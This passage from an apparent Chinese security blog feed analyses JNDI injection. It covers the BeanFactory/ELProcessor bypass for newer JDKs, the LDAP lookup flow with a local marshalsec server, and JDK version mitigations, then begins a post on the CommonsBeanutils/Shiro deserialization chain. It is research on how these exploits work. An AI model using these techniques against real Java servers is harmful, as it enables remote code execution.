class="hljs-built_in">Object</span> obj, <span class="hljs-built_in">Name</span> <span class="hljs-built_in">name</span>, Context nameCtx,<br>                                Hashtable&lt;?,?&gt; environment)<br>    throws NamingException &#123;<br><br>    Reference ref = (Reference) obj;<br>    String beanClassName = ref.getClassName();<br>    ClassLoader tcl = Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-comment">// 1. 反射获取类对象</span><br>    <span class="hljs-keyword">if</span> (tcl != null) &#123;<br>        beanClass = tcl.loadClass(beanClassName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        beanClass = Class.forName(beanClassName);<br>    &#125;<br>    <span class="hljs-comment">// 2. 初始化类实例</span><br>    <span class="hljs-built_in">Object</span> bean = beanClass.getConstructor().newInstance();<br><br>    <span class="hljs-comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span><br>    RefAddr ra = ref.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;forceString&quot;</span>);<br>    String value = (String)ra.getContent();<br><br>    <span class="hljs-comment">// 4. 循环解析别名并保存到字典中</span><br>    <span class="hljs-keyword">for</span> (String <span class="hljs-built_in">param</span>: value.split(<span class="hljs-string">&quot;,&quot;</span>)) &#123;<br>        <span class="hljs-built_in">param</span> = <span class="hljs-built_in">param</span>.<span class="hljs-built_in">trim</span>();<br>        index = <span class="hljs-built_in">param</span>.indexOf(<span class="hljs-string">&#x27;=&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;<br>            setterName = <span class="hljs-built_in">param</span>.substring(index + <span class="hljs-number">1</span>).<span class="hljs-built_in">trim</span>();<br>            <span class="hljs-built_in">param</span> = <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">0</span>, index).<span class="hljs-built_in">trim</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setterName = <span class="hljs-string">&quot;set&quot;</span> +<br>                <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>).toUpperCase(Locale.ENGLISH) +<br>                <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">1</span>);<br>        &#125;<br>        forced.put(<span class="hljs-built_in">param</span>, beanClass.getMethod(setterName, paramTypes));<br>    &#125;<br><br>    <span class="hljs-comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span><br>    Enumeration&lt;RefAddr&gt; e = ref.getAll();<br>    <span class="hljs-keyword">while</span> (e.hasMoreElements()) &#123;<br>        ra = e.nextElement();<br>        String propName = ra.getType();<br>        String value = (String)ra.getContent();<br>        <span class="hljs-built_in">Object</span>[] valueArray = new <span class="hljs-built_in">Object</span>[<span class="hljs-number">1</span>];<br>        Method method = forced.<span class="hljs-built_in">get</span>(propName);<br>        <span class="hljs-keyword">if</span> (method != null) &#123;<br>            valueArray[<span class="hljs-number">0</span>] = value;<br>            method.invoke(bean, valueArray);<br>        &#125;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面注释标注了关键的部分，我们可以通过在返回给客户端的 <code>Reference</code> 对象的 <code>forceString</code> 字段指定 <code>setter</code> 方法的别名，并在后续初始化过程中进行调用。<br><code>forceString</code> 的格式为 <code>a=foo,bar</code>，以逗号分隔每个需要设置的属性，如果包含等号，则对应的 <code>setter</code> 方法为等号后的值 <code>foo</code>，如果不包含等号，则 <code>setter</code> 方法为默认值 <code>setBar</code>。<br>在后续调用时，调用 <code>setter</code> 方法使用单个参数，且参数值为对应属性对象 <code>RefAddr</code> 的值 (<code>getContent</code>)。因此，实际上我们可以调用任意指定类的任意方法，并指定单个可控的参数。</p><p>因为使用 <code>newInstance</code>创建实例（也就是后面<code>Poc</code>中的<code>ELProcessor</code>），所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法，上面 <code>forceString</code> 可以给属性强制指定一个 <code>setter</code> 方法，参数为一个 <code>String</code> 类型<br>于是找到 <code>javax.el.ELProcessor</code> 作为目标 <code>class</code>，利用 <code>el</code> 表达式执行命令，工具 <a href="https://github.com/welk1n/JNDI-Injection-Bypass">JNDI-Injection-Bypass</a> 中的 <code>EvilRMIServer.java</code> 部分代码如下</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031866.png" alt="zongjie3.png"> </p><p>所以整个绕过流程就是：<br>为了绕过<code>ConfigurationException</code>，需要满足<code>ref.getFactoryClassLocation()</code> 为空，只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code></p><p>之后去分析<code>Reference</code>的调用过程，来到<code>NamingManager</code>，需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在其中一块代码能执行<code>payload</code>，找到了<code>BeanFactory</code><br><code>BeanFactor</code>使用<code>newInstance</code>创建实例，所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法且有办法执行相关命令，于是找到<code>ELProcessor</code>和<code>GroovyShell</code><br>总结起来就是绕过了<code>ConfigurationException</code>，进入<code>NamingManager</code>，使用<code>BeanFactor</code>创建<code>ELProcessor</code>&#x2F;<code>GroovyShell</code>无参实例，然后<code>BeanFactor</code>根据别名去调用方法（执行<code>ELProcessor</code>中的<code>eval</code>方法）</p><p>从代码中能看出该工具还有另一个利用方法，<code>groovy.lang.GroovyShell</code>，原理也是类似的</p><p>传入的 <code>Reference</code>为 <code>ResourceRef</code> 类，后面通过反射的方式实例化 <code>Reference</code> 所指向的任意 <code>Bean Class</code>，调用 <code>setter</code> 方法为所有的属性赋值，该 <code>Bean Class</code> 的类名、属性、属性值，全都来自于 <code>Reference</code> 对象。<code>ResourceRef</code>构造器的第七个参数<code>factoryLocation</code>是远程加载<code>factory</code>的地址，比如是一个<code>url</code>,这里将其设置为<code>null</code>,达到绕过<code>ConfigurationException</code>限制。</p><h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI_LDAP"></a>JNDI_LDAP</h2><h3 id="低版本JDK运行-1"><a href="#低版本JDK运行-1" class="headerlink" title="低版本JDK运行"></a>低版本JDK运行</h3><p>这里使用marshalsec来启动ldap服务端</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">mvn clean <span class="hljs-keyword">package</span> <span class="hljs-title">-DskipTests</span><br></code></pre></td></tr></table></figure><p>编译生成可执行jar包</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031505.png" alt="image-20230309202850493">启动服务端</p><p>客户端代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/foo&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ret&quot;</span>+lookup);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用jdk8u65时</p><p><img src="D:/mdimage/image-20230309203535976.png" alt="image-20230309203535976"> </p><p><code>JNDI</code>发起<code>ldap</code>的<code>lookup</code>后，将有如下的调用流程，这里我们直接来关注，获得远程<code>LDAP Server</code>的<code>Entry</code>之后，<code>Client</code>这边是怎么做处理的</p><p><img src="D:/mdimage/image-20230309211408157.png" alt="image-20230309211408157"> </p><p><code>LADP</code>服务利用流程分析，<code>LADP</code>服务前面的调用流程和<code>jndi</code>是基本一样，从<code>Obj</code>类的<code>decodeObject</code>方法这里就有些不太一样了，<code>decodeObject</code>方法内部调用了<code>decodeReference</code>方法<br>跟进<code>com.sun.jndi.ldap.Obj.java#decodeObject</code>，按照该函数的注释来看，其主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象，也可能是一个<code>Reference</code>对象。关于序列化对象的处理，我们看后面一节。这里摘取了<code>Reference</code>的处理方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> Object <span class="hljs-title function_">decodeObject</span><span class="hljs-params">(Attributes var0)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">4</span>]));<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Attribute var1;<br>        <span class="hljs-keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">1</span>])) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> helper.getURLClassLoader(var2);<br>            <span class="hljs-keyword">return</span> deserializeObject((<span class="hljs-type">byte</span>[])((<span class="hljs-type">byte</span>[])var1.get()), var3);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">7</span>])) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>]).get(), (String)var1.get(), var2);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">0</span>]);<br>            <span class="hljs-type">return</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span>= <span class="hljs-literal">null</span> || !var1.contains(JAVA_OBJECT_CLASSES[<span class="hljs-number">2</span>]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[<span class="hljs-number">2</span>]) ? <span class="hljs-literal">null</span> : decodeReference(var0, var2);<br>            <span class="hljs-comment">//此处调用的decodeReference方法</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException var5) &#123;<br>        <span class="hljs-type">NamingException</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NamingException</span>();<br>        var4.setRootCause(var5);<br>        <span class="hljs-keyword">throw</span> var4;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Obj</code>类的<code>decodeReference</code>方法根据<code>Ldap</code>传入的<code>addAttribute</code>属性构造并返回了一个新的<code>reference</code>对象引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">decodeReference</span><span class="hljs-params">(Attributes var0, String[] var1)</span> <span class="hljs-keyword">throws</span> NamingException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Attribute var2;<br>        <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>])) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidAttributesException</span>(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>] + <span class="hljs-string">&quot; attribute is required&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (String)var2.get();<br>            <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">3</span>])) != <span class="hljs-literal">null</span>) &#123;<br>                var4 = (String)var2.get();<br>            &#125;<br>            <span class="hljs-comment">//返回一个新的Reference对象引用</span><br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(var3, var4, var1 != <span class="hljs-literal">null</span> ? var1[<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">//获取第6个属性</span><br>            <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">5</span>])) != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//省略部分代码</span><br>            &#125;<br>            <span class="hljs-comment">//直接返回reference对象</span><br>            <span class="hljs-keyword">return</span> var5;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LADP</code>服务的<code>Reference</code>对象引用的获取和<code>jndi</code>注入中的不太一样，<code>jndi</code>是通过<code>ReferenceWrapper_Stub</code>对象的<code>getReference</code>方法获取<code>reference</code>对象，而<code>LADP</code>服务是根据传入的属性构造一个新的<code>reference</code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为<code>null</code>则直接返回新的<code>reference</code>对象引用。</p><p>在new一个Reference时，三个属性如下</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192036922.png" alt="image-20230309212054690"> </p><p>接着会返回到<code>decodeObject</code>方法调用处，然后再返回到<code>LdapCtx</code>类的<code>c_lookup</code>方法调用处，接着往下执行调用<code>getObjectInstance</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx , Hashtable&lt;?,?&gt; environment, Attributes attrs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>           ObjectFactory factory;<br>           <span class="hljs-comment">//获取对象工厂</span><br>           <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>           <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">// builder must return non-null factory</span><br>               factory = builder.createObjectFactory(refInfo, environment);<br>               <span class="hljs-keyword">if</span> (factory <span class="hljs-keyword">instanceof</span> DirObjectFactory) &#123;<br>                   <span class="hljs-keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(<br>                       refInfo, name, nameCtx, environment, attrs);<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>                       environment);<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// use reference if possible</span><br>           <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>           <span class="hljs-comment">//判断reference对象是否为Reference</span><br>           <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>                <span class="hljs-comment">//转换为Reference类型</span><br>               ref = (Reference) refInfo;<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>               ref = ((Referenceable)(refInfo)).getReference();<br>           &#125;<br><br>           Object answer;<br>           <span class="hljs-comment">//reference对象是否为空</span><br>           <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//获取工厂类名Exp</span><br>               <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>               <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br>                   <span class="hljs-comment">//根据工厂类远程获取对象引用</span><br>                   factory = getObjectFactoryFromReference(ref, f);<br>                   <span class="hljs-keyword">if</span> (factory <span class="hljs-keyword">instanceof</span> DirObjectFactory) &#123;<br>                       <span class="hljs-keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(<br>                           ref, name, nameCtx, environment, attrs);<br>                   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                       <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                        environment);<br>                   &#125;<br>                   <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>                   <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>                   <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>                   <span class="hljs-keyword">return</span> refInfo;<br><br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>                   <span class="hljs-comment">// containing URLs</span><br>                   <span class="hljs-comment">// ignore name &amp; attrs params; not used in URL factory</span><br><br>                   answer = processURLAddrs(ref, name, nameCtx, environment);<br>                   <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                       <span class="hljs-keyword">return</span> answer;<br>                   &#125;<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// try using any specified factories</span><br>           answer = createObjectFromFactories(refInfo, name, nameCtx,<br>                                              environment, attrs);<br>           <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br><br>   &#125;<br></code></pre></td></tr></table></figure><p><code>getObjectInstance</code>方法将<code>reference</code>对象转换为<code>Reference</code>类型并判断<code>reference</code>对象是否为空，如果不为空则从<code>reference</code>引用中获取工厂类<code>Exp</code>名字，接着调用<code>getObjectFactoryFromReference</code>方法根据工厂类Exp名字获取远程调用对象。</p><p><code>getObjectFactoryFromReference</code>方法实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> ObjectFactory <span class="hljs-title function_">getObjectFactoryFromReference</span><span class="hljs-params">(Reference ref, String factoryName)</span> <span class="hljs-keyword">throws</span> IllegalAccessException,InstantiationException, MalformedURLException &#123;<br>    Class&lt;?&gt; clas = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-comment">// Try to use current class loader</span><br>    <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-comment">//尝试先在本地加载Exp类</span><br>         clas = helper.loadClass(factoryName);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        <span class="hljs-comment">// ignore and continue</span><br>        <span class="hljs-comment">// e.printStackTrace();</span><br>    &#125;<br>    <span class="hljs-comment">// All other exceptions are passed up.</span><br><br>    <span class="hljs-comment">// Not in class path; try to use codebase</span><br>    String codebase;<br>    <span class="hljs-comment">//获取远程地址</span><br>    <span class="hljs-keyword">if</span> (clas == <span class="hljs-literal">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//loadClass方法远程加载Exp类</span><br>            clas = helper.loadClass(factoryName, codebase);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (clas != <span class="hljs-literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/e81b0bd5-336c-4141-8925-dc09a0ccfa3d.png" alt="ldap_low6.png"> </p><p>可以看到<code>LDAP</code>服务跟<code>jndi</code>一样，会尝试先在本地查找加载<code>Exp</code>类，如果本地没有找到<code>Exp</code>类，那么<code>getFactoryClassLocation</code>方法会获取远程加载的<code>url</code>地址，如果不为空则根据远程<code>url</code>地址使用类加载器<code>URLClassLoader</code>来加载<code>Exp</code>类，通过分析发现<code>LDAP</code>服务的整个利用流程都没有<code>URLCodebase</code>限制。<br>看一下整个调用站栈</p><p><img src="D:/mdimage/b956cc02-77f5-47b0-91fb-b50bd619731e.png" alt="ldap_low7.png"> </p><p><a href="https://tttang.com/archive/1611/#toc__2">JNDI注入分析 - 跳跳糖 (tttang.com)</a></p><p><a href="https://paper.seebug.org/942/#2-rmi-jndi-reference-payload">如何绕过高版本 JDK 的限制进行 JNDI 注入利用 (seebug.org)</a></p><p>后面这块没搞明白了，挖个坑</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>JDK 5U45</code>、<code>6U45</code>、<code>7u21</code>、<code>8u121</code> 开始 <code>java.rmi.server.useCodebaseOnly</code> 默认配置为<code>true</code></li><li><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code></li><li><code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code> 开始 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认为<code>false</code></li></ul><p>由于<code>JNDI</code>注入动态加载的原理是使用<code>Reference</code>引用<code>Object Factory</code>类，其内部在上文中也分析到了使用的是<code>URLClassLoader</code>，所以不受<code>java.rmi.server.useCodebaseOnly=false</code>属性的限制。<br>但是不可避免的受到 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>的限制。</p><p>所以，<code>JNDI-RMI</code>注入方式有： <code>codebase</code>(<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code>之前可以)  </p><p>利用本地<code>Class Factory</code>作为<code>Reference Factory</code></p><p><code>JNDI-LDAP</code>注入方式： <code>codebase</code>(<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之前可以) </p><p> <code>serialize</code>（两个切入点）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CB与无依赖shiro利用链</title>
    <link href="/Decemberus.github-io/2022/12/03/CommonsBeanutils%E4%B8%8E%E6%97%A0%E4%BE%9D%E8%B5%96shiro%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/Decemberus.github-io/2022/12/03/CommonsBeanutils%E4%B8%8E%E6%97%A0%E4%BE%9D%E8%B5%96shiro%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h1><p><code>java.util.PriorityQueue</code>可以利用Comparator的compare()方法，接下来我们需要寻找能否找到其他可以利用的<code>java.util.Comparator</code></p><h2 id="JavaBean的简单回顾"><a href="#JavaBean的简单回顾" class="headerlink" title="JavaBean的简单回顾"></a>JavaBean的简单回顾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;catalina&quot;</span>;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单来说就是含有getter和setter两个方法的类</p><p>commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(), <span class="hljs-string">&quot;name&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时，commons-beanutils会自动找到name属性的getter方法，也就是 getName ，然后调用，获得返回值。除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p><h2 id="getter的妙用"><a href="#getter的妙用" class="headerlink" title="getter的妙用"></a>getter的妙用</h2><p>我们需要找可以利用的 java.util.Comparator 对象，在commons-beanutils包中就存在一个： <code>org.apache.commons.beanutils.BeanComparator</code> 。</p><p><code>BeanComparator</code> 是<code>commons-beanutils</code>提供的用来比较两个JavaBean是否相等的类，其实现了<code>java.util.Comparator</code> 接口。我们看它的compare方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">( T o1, T o2 )</span> &#123;<br><br>    <span class="hljs-keyword">if</span> ( property == <span class="hljs-literal">null</span> ) &#123;<br>        <span class="hljs-comment">// compare the actual objects</span><br>        <span class="hljs-keyword">return</span> internalCompare( o1, o2 );<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o1, property );<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o2, property );<br>        <span class="hljs-keyword">return</span> internalCompare( value1, value2 );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( IllegalAccessException iae ) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span 